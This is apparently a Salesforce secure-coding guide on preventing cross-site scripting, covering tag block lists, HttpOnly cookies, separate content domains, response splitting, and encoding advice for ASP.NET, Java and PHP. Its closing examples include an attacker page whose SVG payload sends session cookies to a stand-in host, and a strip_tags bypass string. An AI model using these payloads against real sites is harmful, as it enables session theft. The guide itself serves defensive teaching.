<applet\> <body\> <button\> <embed\> <form\> <frame\> <frameset\> <html\> <iframe\> <image\> <ilayer\> <input\> <layer\> <link\> <math\> <meta\> <object\> <script\> <style\> <video\>

Be aware that the above list cannot be exhaustive. Similarly, there is no complete list of JavaScript event handler names (although see [this page on Quirksmode](http://www.quirksmode.org/js/events_events.html)), so there can be no perfect list of bad HTML element attribute names.

Instead, it makes more sense to create a well-defined known-good subset of HTML elements and attributes. Using your programming language’s HTML or XML parsing library, create an HTML input handling routine that throws away all HTML elements and attributes not on the known-good list. This way, you can still allow a wide range of text formatting options without taking on unnecessary XSS risk. Creating such an input validator is usually around 100 lines of code in a language like Python or PHP; it might be more in Java but is still very tractable.

HTTP Only Cookies

When possible, set the *HttpOnly* attribute on your cookies. This flag tells the browser to reveal the cookie only over HTTP or HTTPS connections, but to have *document.cookie* evaluate to a blank string when JavaScript code tries to read it. (Some browsers do still let JavaScript code overwrite or append to *document.cookie*, however.) If your application does require the ability for JavaScript to read the cookie, then you won’t be able to set *HttpOnly*. Otherwise, you might as well set this flag.

Note that *HttpOnly* is not a defense against XSS, it is only a way to briefly slow down attackers exploiting XSS with the simplest possible attack payloads. It is not a bug or vulnerability for the *HttpOnly* flag to be absent.

Stored XSS Resulting from Arbitrary User Uploaded Content

Applications such as Content Management, Email Marketing, etc. may need to allow legitimate users to create and/or upload custom HTML, Javascript or files. This feature could be misused to launch XSS attacks. For instance, a lower privileged user could attack an administrator by creating a malicious HTML file that steals session cookies. The recommended protection is to serve such arbitrary content from a separate domain outside of the session cookie's scope.

Let’s say cookies are scoped to https://app.site.com. Even if customers can upload arbitrary content, you can always serve the content from an alternate domain that is outside of the scoping of any trusted cookies (session cookies and other sensitive information). As an example, pages on https://app.site.com would reference customer-uploaded HTML templates as IFRAMES using a link to https://content.site.com/cust1/templates?templId=13&auth=someRandomAuthenticationToken

The authentication token would substitute for the session cookie since sessions scoped to app.site.com would not be sent to content.site.com. If the data being stored is sensitive, a one time use or short lived token should be used. This is the method that Salesforce uses for our content product.

HTTP Response Splitting

HTTP response splitting is a vulnerability closely related to XSS, and for which the same defensive strategies apply. Response splitting occurs when user data is inserted into an HTTP header returned to the client. Instead of inserting malicious script, the attack is to insert additional newline characters. Because headers and the response body are delimited by newlines in HTTP, this allows the attacker to insert their own headers and even construct their own page body (which might have an XSS payload inside). To prevent HTTP response splitting, filter ‘ ’ and ‘\\r’ from any output used in an HTTP header.

ASP.NET

ASP.NET provides several built-in mechanisms to help prevent XSS, and Microsoft supplies several free tools for identifying and preventing XSS in sites built with .NET technology.

An excellent general discussion of preventing XSS in ASP.NET 1.1 and 2.0 can be found at the Microsoft Patterns & Practices site: [Howto Prevent XSS in ASP](http://msdn.microsoft.com/en-us/library/ms998274.aspx)

By default, ASP.NET enables request validation on all pages, to prevent accepting of input containing unencoded HTML. (For more details see [http://www.asp.net/learn/whitepapers/request-validation/](http://www.asp.net/learn/whitepapers/request-validation/).) Verify in your Machine.config and Web.config that you have not disabled request validation. Identify and correct any pages that may have disabled it individually by searching for the ValidateRequest request attribute in the page declaration tag. If this attribute is not present, it defaults to true.

Input Validation

For server controls in ASP.NET, it is simple to add server-side input validation using <asp:RegularExpressionValidator\>.

If you are not using server controls, you can use the Regex class in the [System.Text.RegularExpressions](http://msdn.microsoft.com/en-us/library/ms998267.aspx) namespace or use other supporting classes for validation.

For example regular expressions and tips on other validation routines for numbers, dates, and URL strings, see [Microsoft Patterns & Practices: “How To: Protect from Injection Attacks in ASP.NET”](http://msdn.microsoft.com/en-us/library/bb355989.aspx).

Output Filtering & Encoding

The System.Web.HttpUtility class provides convenient methods, HtmlEncode and UrlEncode for escaping output to pages. These methods are safe, but follow a “blocklist” approach that encodes only a few characters known to be dangerous. Microsoft also makes available the AntiXSS Library that follows a more restrictive approach, encoding all characters not in an extensive, internationalized allowlist.

Tools and Testing

Microsoft provides a free static analysis tool, CAT.NET. CAT.NET is a snap-in to Visual Studio that helps identify XSS as well as several other classes of security flaw. Visual Studio has built-in static analysis features that can help identify security vulnerabilities:[https://learn.microsoft.com/en-us/visualstudio/code-quality/overview-of-code-analysis-for-managed-code](https://learn.microsoft.com/en-us/visualstudio/code-quality/overview-of-code-analysis-for-managed-code)

Java

J2EE web applications have perhaps the greatest diversity of frameworks available for handling user input and creating pages. Several strong, all-purpose libraries are available, but it is important to understand what your particular platform provides.

Input Filtering

Take advantage of built-in framework tools to validate input as it is being used to generate business or model objects. In Struts, input validation rules can be defined in XML using the Validator Plugin in your struts-config.xml:

```

```

Or you can build programmatic validation directly into your form beans with regular expressions.

Learn more about Java regular expressions here: [Java Regex Documentation](http://java.sun.com/docs/books/tutorial/essential/regex/).

The Spring Framework also provides utilities for building automatic validation into data binding. You can implement the org.springframework.validation.Validator interface with the help of Spring’s ValidationUtils class to protect your business objects. Get more information here: [Spring Validation](http://static.springsource.org/spring/docs/2.0.8/reference/validation.html).

A more generic approach, applicable to any kind of Java object, is presented by the OVal object validation framework. OVal allows constraints on objects to be declared with annotations, through [POJOs](http://en.wikipedia.org/wiki/Plain_Old_Java_Object) or in XML, and expressing custom constraints as Java classes or in a variety of scripting languages. The system is quite powerful, implements Programming by Contract features using AspectJ, and provides some built-in support for frameworks like Spring. Learn more about OVal at: [OVal](http://oval.sourceforge.net/)

Output Filtering and Encoding

JSTL tags such as <c:out\> have the excapeXml attribute set to true by default, This default behavior ensures that HTML special characters are entity-encoded and prevents many XSS attacks. If any tags in your application set escapeXml="false" (such as for outputting the Japanese yen symbol) you need to apply some other escaping strategy. For JSF, the tag attribute is escape, and is also set to true by default for <h:outputText\> and <h:outputFormat\>.

Other page generation systems do not always escape output by default. Freemarker is one example. All application data included in a Freemarker template should be surrounded with an <#escape> directive to do output encoding (e.g. <#escape x as x?html>) or by manually adding ?html (or ?js\_string for JavaScript contexts) to each expression (e.g. ${username?html}).

Custom JSP tags or direct inclusion of user data variables with JSP expressions (e.g. <%= request.getHeader("HTTP\_REFERER") %>) or scriptlets (e.g. <% out.println(request.getHeader("HTTP\_REFERER") %>) should be avoided.

If you are using a custom page-generation system, one that does not provide output escaping mechanisms, or building directly with scriptlets, there are several output encoding libraries available. The OWASP Enterprise Security API for Java is a mature project that offers a variety of security services to J2EE applications. The org.owasp.esapi.codecs package provides classes for encoding output springs safely for HTML, JavaScript and several other contexts. Get it here: [OWASP Enterprise Security API (ESAPI)](https://owasp.org/www-project-enterprise-security-api/)

PHP

Input Filtering

As of PHP 5.2.0, data filtering is a part of the PHP Core. The package documentation is available at: [PHP Data Filtering Library](http://us2.php.net/filter).

Two types of filters can be declared: sanitization filters that strip or encode certain characters, and validation filters that can apply business logic rules to inputs.

Output Encoding

PHP provides two built-in string functions for encoding HTML output. [htmlspecialchars](https://www.php.net/manual/en/function.htmlspecialchars.php) encodes only &, ", ', <, and >, while [htmlentities](https://www.php.net/manual/en/function.htmlentities.php) encodes all HTML characters with defined entities.

For bulletin-board like functionality where HTML content is intended to be included in output, the [strip\_tags](http://us3.php.net/strip_tags) function is also available to return a string with all HTML and PHP tags removed, but because this function is implemented with a regex that does not validate that incoming strings are well-formed HTML, partial or broken tags may be able to bypass the system. For example, the string <<b\>script>alert('xss');<</b\>/script> might have the <b\> and </b\> tags removed, leaving the vulnerable string <script\>alert('xss');</script\>. If you are going to rely on this function, input must be sent to an HTML validating and tidying program first. (Note that in PHP 5.2.6, strip\_tags does appear to work, reducing the aforementioned attack string to alert('xss'). Does it work in your version?)

## Code Examples

```
<apex:page>
<!-- Vulnerable Page at https://example.com/api/search -->
  <div id='greet'></div>
    <script>
      document.querySelector('#greet').innerHTML='You searched for <b>{!$CurrentPage.parameters.q}</b>';
    </script>
</apex:page>
```

```
<html>
  <!-- Evil Page -->
  <body>
    <h1>Ten Ways to Pay Down Your Mortgage</h1>
      <iframe id='attack' style='visibility:hidden'>  
        <script>
         var payload = "\x3csvg onload=\x27document.location.href=\x22http://cybervillians.com?session=\x22+document.cookie\x27\x3e";
         document.querySelector('#attack').src = "https://example.com/api/search?q=" +
                 encodeURIComponent(payload);
        </script>
  </body>
</html>
```

```
<html>
<!-- Response From Server -->
  <div id='greet'></div>
    <script>
      document.querySelector('#greet').innerHTML = 'You searched for <b>\x3csvg onload=\x27document.location.href=\x22http://cybervillians.com?session=\x22+document.cookie\x27\x3e</b>';
    </script>
</html>
```

```
<div id='greet'>
  You searched for
    <b>
        <svg onload='document.location.href="http://cybervillians.com?session=" + document.cookie'>
    </b>  
</div>
```

```
<script>
  document.querySelector('#greet').innerHTML='You searched for <b>"{!$CurrentPage.parameters.q}"</b>';
</script>
```
